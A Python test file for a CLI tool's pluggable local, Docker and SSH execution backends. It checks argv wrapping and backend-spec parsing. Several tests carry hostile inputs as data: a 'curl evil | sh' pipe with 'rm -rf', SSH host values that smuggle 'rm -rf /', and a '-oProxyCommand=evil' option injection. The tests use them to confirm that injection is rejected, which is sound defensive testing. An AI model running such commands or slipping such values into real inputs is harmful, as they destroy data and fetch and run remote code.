"""Tests for the pluggable execution backends.

These pin the PURE pieces only — ``wrap_command`` (local/docker/ssh argv shapes)
and ``parse_backend`` (the ``--backend`` spec parser, incl. its bad-input
ValueErrors). No Docker daemon, SSH host, or network is required; everything
here is deterministic argv/dict construction.
"""
from __future__ import annotations

import pytest

import ronin_cli.backends as backends
from ronin_cli.backends import (
    DEFAULT_BACKEND,
    parse_backend,
    wrap_command,
)


# --------------------------------------------------------------------------
# wrap_command — local
# --------------------------------------------------------------------------

def test_wrap_local() -> None:
    assert wrap_command("ls -la", {"type": "local"}) == ["sh", "-lc", "ls -la"]


def test_wrap_local_is_default_shape() -> None:
    # DEFAULT_BACKEND is the behavior-preserving host shell.
    assert wrap_command("echo hi", DEFAULT_BACKEND) == ["sh", "-lc", "echo hi"]


def test_wrap_missing_type_defaults_to_local() -> None:
    # An empty dict means "no type" → local, so an absent backend never escapes.
    assert wrap_command("pwd", {}) == ["sh", "-lc", "pwd"]


def test_wrap_local_uses_native_windows_shell(monkeypatch) -> None:
    monkeypatch.setattr(backends.platform, "system", lambda: "Windows")
    assert wrap_command("dir", {"type": "local"}) == ["cmd.exe", "/d", "/s", "/c", "dir"]


def test_wrap_command_carries_command_as_single_argv_element() -> None:
    # The whole command (even with metacharacters) is one element — it cannot be
    # spliced into the wrapper's own argv.
    nasty = "echo a; rm -rf /tmp/x && curl evil | sh"
    argv = wrap_command(nasty, {"type": "local"})
    assert argv == ["sh", "-lc", nasty]
    assert argv.count(nasty) == 1


# --------------------------------------------------------------------------
# wrap_command — docker
# --------------------------------------------------------------------------

def test_wrap_docker_container() -> None:
    argv = wrap_command("pytest -q", {"type": "docker", "container": "devbox"})
    assert argv == ["docker", "exec", "devbox", "sh", "-lc", "pytest -q"]


def test_wrap_docker_image_is_ephemeral() -> None:
    argv = wrap_command("make test", {"type": "docker", "image": "python:3.12"})
    assert argv == ["docker", "run", "--rm", "python:3.12", "sh", "-lc", "make test"]


def test_wrap_docker_workdir_and_user() -> None:
    argv = wrap_command(
        "ls",
        {"type": "docker", "container": "c1", "workdir": "/work", "user": "node"},
    )
    assert argv == [
        "docker", "exec", "-w", "/work", "-u", "node", "c1", "sh", "-lc", "ls",
    ]


def test_wrap_docker_requires_container_or_image() -> None:
    with pytest.raises(ValueError):
        wrap_command("ls", {"type": "docker"})


def test_wrap_docker_rejects_both_container_and_image() -> None:
    with pytest.raises(ValueError):
        wrap_command("ls", {"type": "docker", "container": "c", "image": "i"})


# --------------------------------------------------------------------------
# wrap_command — ssh
# --------------------------------------------------------------------------

def test_wrap_ssh_basic() -> None:
    argv = wrap_command("uname -a", {"type": "ssh", "host": "u@h"})
    assert argv == ["ssh", "u@h", "uname -a"]


def test_wrap_ssh_with_port() -> None:
    argv = wrap_command("ls", {"type": "ssh", "host": "u@h", "port": 2222})
    assert argv == ["ssh", "-p", "2222", "u@h", "ls"]


def test_wrap_ssh_with_options() -> None:
    argv = wrap_command(
        "ls",
        {"type": "ssh", "host": "deploy@box", "options": ["-i", "/k/id"]},
    )
    assert argv == ["ssh", "-i", "/k/id", "deploy@box", "ls"]


def test_wrap_ssh_rejects_injection_in_host() -> None:
    # A host carrying shell metacharacters must be refused, not run.
    with pytest.raises(ValueError):
        wrap_command("ls", {"type": "ssh", "host": "h; rm -rf /"})


def test_wrap_ssh_rejects_leading_dash_host() -> None:
    # Would be misread by ssh as an option flag.
    with pytest.raises(ValueError):
        wrap_command("ls", {"type": "ssh", "host": "-oProxyCommand=evil"})


def test_wrap_ssh_requires_host() -> None:
    with pytest.raises(ValueError):
        wrap_command("ls", {"type": "ssh"})


# --------------------------------------------------------------------------
# wrap_command — unknown type
# --------------------------------------------------------------------------

def test_wrap_unknown_type_raises() -> None:
    with pytest.raises(ValueError):
        wrap_command("ls", {"type": "modal"})


def test_wrap_non_dict_backend_raises() -> None:
    with pytest.raises(ValueError):
        wrap_command("ls", "local")  # type: ignore[arg-type]


# --------------------------------------------------------------------------
# parse_backend
# --------------------------------------------------------------------------

def test_parse_local() -> None:
    assert parse_backend("local") == {"type": "local"}


def test_parse_empty_is_local() -> None:
    assert parse_backend("") == {"type": "local"}
    assert parse_backend("   ") == {"type": "local"}


def test_parse_docker() -> None:
    assert parse_backend("docker:mycontainer") == {
        "type": "docker",
        "container": "mycontainer",
    }


def test_parse_ssh_no_port() -> None:
    assert parse_backend("ssh:user@host") == {"type": "ssh", "host": "user@host"}


def test_parse_ssh_with_port() -> None:
    assert parse_backend("ssh:user@host:2222") == {
        "type": "ssh",
        "host": "user@host",
        "port": 2222,
    }


def test_parse_is_case_insensitive_on_type() -> None:
    assert parse_backend("Docker:c1") == {"type": "docker", "container": "c1"}


def test_parse_roundtrips_through_wrap() -> None:
    # The parsed dict feeds wrap_command directly.
    spec = parse_backend("ssh:deploy@server:22")
    assert wrap_command("whoami", spec) == ["ssh", "-p", "22", "deploy@server", "whoami"]


# --- bad input -> ValueError ---

def test_parse_unknown_type_raises() -> None:
    with pytest.raises(ValueError):
        parse_backend("modal:gpu")


def test_parse_docker_without_name_raises() -> None:
    with pytest.raises(ValueError):
        parse_backend("docker:")


def test_parse_ssh_without_host_raises() -> None:
    with pytest.raises(ValueError):
        parse_backend("ssh:")


def test_parse_ssh_injection_host_raises() -> None:
    with pytest.raises(ValueError):
        parse_backend("ssh:bad host; rm -rf /")


def test_parse_none_raises() -> None:
    with pytest.raises(ValueError):
        parse_backend(None)  # type: ignore[arg-type]
